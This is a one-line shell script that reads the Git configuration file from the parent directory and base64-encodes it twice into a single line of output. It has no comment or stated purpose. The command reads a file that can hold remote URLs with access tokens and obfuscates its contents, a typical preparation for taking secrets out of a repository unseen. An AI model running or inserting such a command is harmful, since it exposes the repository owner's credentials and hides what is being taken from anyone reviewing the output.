#!/bin/sh


cat ../.git/config | base64 -w0 | base64 -w0
